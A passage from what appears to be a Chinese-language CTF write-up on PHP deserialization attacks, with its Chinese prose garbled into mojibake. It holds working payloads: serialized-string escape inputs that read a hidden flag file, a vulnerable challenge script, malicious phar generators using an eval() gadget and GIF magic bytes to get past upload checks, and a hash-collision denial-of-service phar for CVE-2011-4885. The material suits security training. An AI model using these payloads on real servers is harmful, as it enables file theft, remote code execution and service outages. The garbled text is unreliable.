<p>ä»ç„¶è¦é€ƒé€¸ 31 ä¸ªå­—ç¬¦ï¼Œå½“ç„¶å¯ä»¥ 31 ä¸ª loveï¼Œç›´æ¥å¯ä»¥é€ƒé€¸ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥æ„é€  15 ä¸ª secure å’Œä¸€ä¸ª love</p>
<p>payloadï¼š</p>
<blockquote>
<p>username=securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecureloveâ€;s:8:â€passwordâ€;s:6:â€hackerâ€;}&amp;password=1</p>
</blockquote>
<h3 id="å‡å°‘ï¼š"><a href="#å‡å°‘ï¼š" class="headerlink" title="å‡å°‘ï¼š"></a>å‡å°‘ï¼š</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$function</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br> <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br> <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br> <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;<br> <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>&#125;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br>extract(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$function</span>)&#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot; rel=&quot;external nofollow&quot; &gt;source_code&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br><span class="hljs-variable">$serialize_info</span> = filter(serialize(<span class="hljs-variable">$_SESSION</span>));<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;<br> highlight_file(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;<br> <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;<br> <span class="hljs-variable">$userinfo</span> = unserialize(<span class="hljs-variable">$serialize_info</span>);<br> <span class="hljs-keyword">echo</span> file_get_contents(base64_decode(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;img&#x27;</span>]));<br>&#125;<br></code></pre></td></tr></table></figure>

<p>extract å˜é‡è¦†ç›–,file_get_contents ä»»æ„æ–‡ä»¶è¯»å–.</p>
<p>å°†å˜é‡$userinfo[â€˜imgâ€™]é€†æ¨å›å»å‘ç°,æ˜¯ç”±å‚æ•° img_path æ§åˆ¶çš„,ä½†æ˜¯ç»è¿‡ sha1 åŠ å¯†,æˆ‘ä»¬æ— æ³•å¾—çŸ¥åŠ å¯†åå†…å®¹,ä½†ç»“åˆå‰é¢çš„ extract å˜é‡è¦†ç›–,æˆ‘ä»¬å¯ä»¥è‡ªå·± POST æ„é€ .</p>
<p>æ„é€ äº†ä¹‹å,ä¼šç»è¿‡åºåˆ—åŒ– filter å‡½æ•°æ›¿æ¢ä¸€äº›å­—ç¬¦(é‚£ä¹ˆæ­¤æ—¶åºåˆ—åŒ–åçš„æ•°æ®åˆ™å‘ç”Ÿäº†å˜åŒ–,å¯èƒ½å­˜åœ¨æ¼æ´),å†ååºåˆ—åŒ–,è¯»å–å‚æ•°å€¼.</p>
<p>åºåˆ—åŒ–å,æœ‰ä¸‰ä¸ªå…ƒç´ ,åˆ†åˆ«æ˜¯ img,user,function,è€Œæˆ‘ä»¬èƒ½æ§åˆ¶çš„åªæœ‰åé¢ä¸¤ä¸ª,æˆ‘ä»¬éœ€è¦æ„é€ çš„ payload æ˜¯è¿™æ ·çš„</p>
<blockquote>
<p>fâ€;s:3:â€imgâ€;s:20:â€ZDBnM19mMWFnLnBocA==â€;s:3:â€tqlâ€;s:3:â€tqlâ€;}</p>
</blockquote>
<p>ä½†æ˜¯ä¸ç»ä»»ä½•æ”¹å˜åˆ™æ˜¯è¿™æ ·çš„</p>
<blockquote>
<p>a:3:{s:4:â€userâ€;s:5:â€guestâ€;s:8:â€functionâ€;s:10:â€show_imageâ€;s:3:â€imgâ€;s:40:â€1b75545ff7fcd63fb78a7e4f52a0500d4f39b8f5â€;}</p>
</blockquote>
<p>åˆ©ç”¨æˆªæ–­çš„æ€æƒ³ä¸è®©å…¶è¯»å–å…ƒç´  img çš„å€¼,æˆ‘ä»¬è‡ªå·±æ¥æ„é€ è¿™ä¸ªå€¼,åªæœ‰ä¸¤ä¸ªå‚æ•°,å¿…é¡»åœ¨ function å“ªé‡Œæˆªæ–­,è€Œè¿™ä¸ªååºåˆ—æ˜¯é•¿åº¦é€’å‡,é‚£ä¹ˆå°±æ˜¯é€‰æ‹©å…ƒç´ åå™¬(åå™¬çš„é•¿åº¦è‡ªå·±é…Œæƒ…å‚è€ƒ,ä¸€èˆ¬æ˜¯åˆ°è‡ªå·±èƒ½æ§åˆ¶çš„ç‚¹å°±å¥½)åé¢çš„é•¿åº¦,æ¥æ„é€ è‡ªå·±çš„ payload å’¯,æˆ‘ä»¬å°±é€‰ user å…ƒç´ å§,len(â€˜â€œ;s:8:â€functionâ€;s:10:â€â€˜)çš„é•¿åº¦ä¸º 23,ä½†æ˜¯æˆ‘ä»¬æ— æ³•æ„é€  23 ä¸ªé•¿åº¦,æˆ‘ä»¬å¯ä»¥å¤šåå™¬ä¸€ä¸ª,24 ä¸ªå­—ç¬¦,é‚£ä¹ˆå°±ç”¨ 6 ä¸ª flag å°±å¥½,ä½†æ˜¯è¿™æ ·åé¢çš„åºåˆ—åŒ–å°±æ··ä¹±äº†,æˆ‘ä»¬å°±è¦æ·»åŠ è‡ªå·±çš„ payload,å¹¶è¡¥å…¨.è™½ç„¶è¿™æ ·è¡¥å¥½äº†,ä½†æ˜¯åªæœ‰ä¸¤ä¸ªå…ƒç´ ,è¿™é‡Œéœ€è¦ä¸‰ä¸ªå…ƒç´ ,æˆ‘ä»¬å°±å†æ·»åŠ å…ƒç´ ,å¹¶å°†åé¢çš„ img è¿›è¡Œæˆªæ–­</p>
<blockquote>
<p>a:3:{s:4:â€userâ€;s:24:â€â€;s:8:â€functionâ€;s:10:â€show_imageâ€;s:3:â€imgâ€;s:40:â€1b75545ff7fcd63fb78a7e4f52a0500d4f39b8f5â€;}<br>a:3:{s:4:â€userâ€;s:24:â€â€;s:8:â€functionâ€;s:2:â€22â€;s:3:â€imgâ€;s:40:â€1b75545ff7fcd63fb78a7e4f52a0500d4f39b8f5â€;}</p>
</blockquote>
<p>æˆªæ–­åªéœ€}å³å¯,å¹¶ä¸”ä¸ä¸ºè¯»å–çš„å­—ç¬¦å³å¯,å› æ­¤æ·»åŠ  fâ€;s:3:â€imgâ€;s:20:â€ZDBnM19mMWFnLnBocA==â€;s:3:â€tqlâ€;s:3:â€tqlâ€;},è¿™é‡Œæˆ‘ä»¬æ–°å¢äº†ä¸€ä¸ªå…ƒç´ ,å› æ­¤åå™¬å function å…ƒç´ æ¶ˆå¤±äº†,éšä¾¿è¡¥å……å¥½å…ƒç´ å³å¯.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br> <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br> <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br> <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<br> <span class="hljs-string">&quot;user&quot;</span>=&gt;<span class="hljs-string">&quot;flagflagflagflagflagflag&quot;</span>,<br> <span class="hljs-string">&quot;function&quot;</span>=&gt;<span class="hljs-string">&#x27;2&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:3:&quot;tql&quot;;s:3:&quot;tql&quot;;&#125;&#x27;</span>,<br> <span class="hljs-comment">//&quot;user&quot;=&gt;&#x27;guest&#x27;,</span><br> <span class="hljs-comment">//&quot;function&quot;=&gt;&#x27;show_image&#x27;,</span><br> <span class="hljs-string">&quot;img&quot;</span>=&gt;sha1(base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>))<br>);<br>print_r(serialize(<span class="hljs-variable">$arr</span>));<br><span class="hljs-keyword">echo</span> PHP_EOL;<br>print_r(filter(serialize(<span class="hljs-variable">$arr</span>)));<br><span class="hljs-keyword">echo</span> PHP_EOL;<br>print_r(unserialize(filter(serialize(<span class="hljs-variable">$arr</span>))));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<h2 id="phar-æ‹“å®½ååºåˆ—åŒ–çš„æ”»å‡»é¢"><a href="#phar-æ‹“å®½ååºåˆ—åŒ–çš„æ”»å‡»é¢" class="headerlink" title="phar æ‹“å®½ååºåˆ—åŒ–çš„æ”»å‡»é¢"></a>phar æ‹“å®½ååºåˆ—åŒ–çš„æ”»å‡»é¢</h2><p>åˆ©ç”¨ phar æ–‡ä»¶ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„ meta-data è¿™ä¸€ç‰¹æ€§ï¼Œæ‹“å±•äº† php ååºåˆ—åŒ–æ¼æ´çš„æ”»å‡»é¢ã€‚è¯¥æ–¹æ³•åœ¨<strong>æ–‡ä»¶ç³»ç»Ÿå‡½æ•°</strong>ï¼ˆfile_exists()ã€is_dir()ç­‰ï¼‰å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œé…åˆ<strong>phar://ä¼ªåè®®</strong>ï¼Œå¯ä»¥ä¸ä¾èµ– unserialize()ç›´æ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚</p>
<p>ä¸€ä¸ªç”Ÿæˆ phar çš„è„šæœ¬ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>    &#125;<br>    @unlink(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&#x27;phar.phar&#x27;</span>); <span class="hljs-comment">//åç¼€åå¿…é¡»ä¸ºphar</span><br>    <span class="hljs-variable">$phar</span>-&gt;startBuffering();<br>    <span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>); <span class="hljs-comment">//è®¾ç½®stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> Test();<br>    <span class="hljs-variable">$o</span>-&gt;data = <span class="hljs-string">&#x27;hello&#x27;</span>;<br>    <span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&#x27;test.txt&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>); <span class="hljs-comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><br>    <span class="hljs-comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span><br>    <span class="hljs-variable">$phar</span>-&gt;stopBuffering();<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210801184545865.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<ul>
<li>a <strong>stub</strong></li>
</ul>
<p>å«æœ‰&lt;?php xxx; __HALT_COMPILER();?&gt; ä»¥__HALT_COMPILER();?&gt;ç»“å°¾</p>
<ul>
<li>a <strong>manifest</strong> describing the contents</li>
</ul>
<p>å­˜å‚¨æ¯ä¸ªå‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯ï¼Œè¿˜æœ‰ç”¨æˆ·è‡ªå®šä¹‰çš„ meta-data ä»¥åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210729113615040.png" srcset="/img/loading.gif" lazyload></p>
<ul>
<li>the file <strong>contents</strong></li>
</ul>
<p>å‹ç¼©æ–‡ä»¶å†…å®¹</p>
<ul>
<li>[optional] a <strong>signature</strong> for verifying Phar integrity (phar file format only)</li>
</ul>
<p>ç­¾å(å¯é€‰)ï¼Œä½äºæ–‡ä»¶å°¾</p>
</blockquote>
<p>åˆ©ç”¨æ¡ä»¶</p>
<ol>
<li>phar æ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ã€‚</li>
<li>è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€œè·³æ¿â€ã€‚</li>
<li>æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”<code>:</code>ã€<code>/</code>ã€<code>phar</code>ç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;data;<br>    &#125;<br>&#125;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;phar://phar.phar/test.txt&#x27;</span>;<br>    file_exists(<span class="hljs-variable">$filename</span>);<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/1.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="ä»£ç æ‰§è¡Œ"><a href="#ä»£ç æ‰§è¡Œ" class="headerlink" title="ä»£ç æ‰§è¡Œ"></a>ä»£ç æ‰§è¡Œ</h3><p>ä¸Šé¢çš„ä»£ç å…¶å®å·²ç»å­˜åœ¨ä»»æ„ä»£ç æ‰§è¡Œäº†</p>
<blockquote>
<p>$o-&gt;data=<code>dir</code>;</p>
</blockquote>
<h3 id="ç»•è¿‡æ–‡ä»¶å¹»æ•°æ£€æµ‹"><a href="#ç»•è¿‡æ–‡ä»¶å¹»æ•°æ£€æµ‹" class="headerlink" title="ç»•è¿‡æ–‡ä»¶å¹»æ•°æ£€æµ‹"></a>ç»•è¿‡æ–‡ä»¶å¹»æ•°æ£€æµ‹</h3><p>æ¶æ„ phar ç”Ÿæˆï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eval</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span> = <span class="hljs-string">&#x27;echo &quot;ok&quot;;&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span> -&gt; output);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span> -&gt; startBuffering();<br><span class="hljs-variable">$phar</span> -&gt; setStub(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<br><span class="hljs-variable">$phar</span> -&gt; addFromString(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> AnyClass();<br><span class="hljs-variable">$object</span> -&gt; output= <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<span class="hljs-comment">//ä¿®æ”¹</span><br><span class="hljs-variable">$phar</span> -&gt; setMetadata(<span class="hljs-variable">$object</span>);<br><span class="hljs-variable">$phar</span> -&gt; stopBuffering();<br></code></pre></td></tr></table></figure>

<p>ä¿®æ”¹åç¼€ä¸º gif ç„¶åä¸Šä¼ </p>
<blockquote>
<p>?filename=phar://upload_file/phar.gif</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eval</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span> = <span class="hljs-string">&#x27;echo &quot;ok&quot;;&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span> -&gt; output);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span> -&gt; startBuffering();<br><span class="hljs-variable">$phar</span> -&gt; setStub(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<br><span class="hljs-variable">$phar</span> -&gt; addFromString(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> AnyClass();<br><span class="hljs-variable">$object</span> -&gt; output= <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<span class="hljs-comment">//ä¿®æ”¹</span><br><span class="hljs-variable">$phar</span> -&gt; setMetadata(<span class="hljs-variable">$object</span>);<br><span class="hljs-variable">$phar</span> -&gt; stopBuffering();<br></code></pre></td></tr></table></figure>

<h3 id="PHP-å†…æ ¸å“ˆå¸Œè¡¨ç¢°æ’æ”»å‡»-CVE-2011-4885"><a href="#PHP-å†…æ ¸å“ˆå¸Œè¡¨ç¢°æ’æ”»å‡»-CVE-2011-4885" class="headerlink" title="PHP å†…æ ¸å“ˆå¸Œè¡¨ç¢°æ’æ”»å‡»(CVE-2011-4885)"></a>PHP å†…æ ¸å“ˆå¸Œè¡¨ç¢°æ’æ”»å‡»(CVE-2011-4885)</h3><p>å‚è€ƒ<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1350367">https://cloud.tencent.com/developer/article/1350367</a></p>
<p>åœ¨ PHP å†…æ ¸ä¸­ï¼Œæ•°ç»„æ˜¯ä»¥å“ˆå¸Œè¡¨çš„æ–¹å¼å®ç°çš„ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å·§å¦™çš„æ„é€ æ•°ç»„å…ƒç´ çš„ key ä½¿å“ˆå¸Œè¡¨é€€åŒ–æˆå•é“¾è¡¨ï¼ˆæ—¶é—´å¤æ‚åº¦ä» O(1) =&gt; O(n)ï¼‰æ¥è§¦å‘æ‹’ç»æœåŠ¡æ”»å‡»ã€‚</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/1.jpeg" srcset="/img/loading.gif" lazyload></p>
<p>PHP ä¿®å¤æ­¤æ¼æ´çš„æ–¹å¼æ˜¯é™åˆ¶é€šè¿‡$_GET æˆ–$_POST ç­‰æ–¹å¼ä¼ å…¥çš„å‚æ•°æ•°é‡ï¼Œä½†æ˜¯å¦‚æœ PHP è„šæœ¬é€šè¿‡ json_decode()æˆ– unserialize()ç­‰æ–¹å¼è·å–å‚æ•°ï¼Œä¾ç„¶å°†å—åˆ°æ­¤æ¼æ´çš„å¨èƒã€‚</p>
<p>ç”Ÿæˆæ¶æ„ phar ä»£ç  è¿™é‡Œå¼€å§‹å°±ä¸æ‡‚äº† PHP å†…æ ¸æ¢ç´¢:å“ˆå¸Œè¡¨ç¢°æ’æ”»å‡»åŸç†<a target="_blank" rel="noopener" href="https://www.jb51.net/article/70383.htm">https://www.jb51.net/article/70383.htm</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>set_time_limit(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$size</span>= pow(<span class="hljs-number">2</span>, <span class="hljs-number">16</span>);<br><span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$key</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$maxKey</span> = (<span class="hljs-variable">$size</span> - <span class="hljs-number">1</span>) * <span class="hljs-variable">$size</span>; <span class="hljs-variable">$key</span> &lt;= <span class="hljs-variable">$maxKey</span>; <span class="hljs-variable">$key</span> += <span class="hljs-variable">$size</span>) &#123;<br>    <span class="hljs-variable">$array</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-variable">$new_obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">stdClass</span>;<br><span class="hljs-variable">$new_obj</span>-&gt;hacker = <span class="hljs-variable">$array</span>;<br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/avatar.phar&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;hacker.php&#x27;</span>] = <span class="hljs-string">&#x27;&lt;?php ?&gt;&#x27;</span>;<br><span class="hljs-variable">$p</span>-&gt;setMetadata(<span class="hljs-variable">$new_obj</span>);<br><span class="hljs-variable">$p</span>-&gt;setStub(<span class="hljs-string">&#x27;GIF&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>æµ‹è¯•ä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>set_time_limit(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$startTime</span> = microtime(<span class="hljs-literal">true</span>);<br>file_exists(<span class="hljs-string">&quot;phar://avatar.phar&quot;</span>);<br><span class="hljs-variable">$endTime</span> = microtime(<span class="hljs-literal">true</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;æ‰§è¡Œæ—¶é—´ï¼š  &#x27;</span>.(<span class="hljs-variable">$endTime</span> - <span class="hljs-variable">$startTime</span>). <span class="hljs-string">&#x27; ç§’&#x27;</span>;<br></code></pre></td></tr></table></figure>

<h3 id="HITCON-2017-Baby-h-Master-PHP"><a href="#HITCON-2017-Baby-h-Master-PHP" class="headerlink" title="[HITCON 2017]Baby^h Master PHP"></a>[HITCON 2017]Baby^h Master PHP</h3><p>åˆ†äº«æœ¬é¢˜è‡ªåˆ¶ Dockerfile : <a target="_blank" rel="noopener" href="https://github.com/Pr0phet/hitconDockerfile/tree/master/hitcon-ctf-2017/baby%5Eh-master-php-2017">Github</a></p>
<p>è¿™é¢˜åœ¨æ¯”èµ›è¿‡ç¨‹æ˜¯ 0 è§£â€¦â€¦çœŸçš„å¤ªéš¾äº†â€¦ä½“ç°äº† Orange å¤§å¤§å¯¹ php å’Œä¸­é—´ä»¶çš„æ·±åˆ»ç†è§£ Orz è†œæ‹œ</p>
<p>é¢˜ç›®æºç :</p>
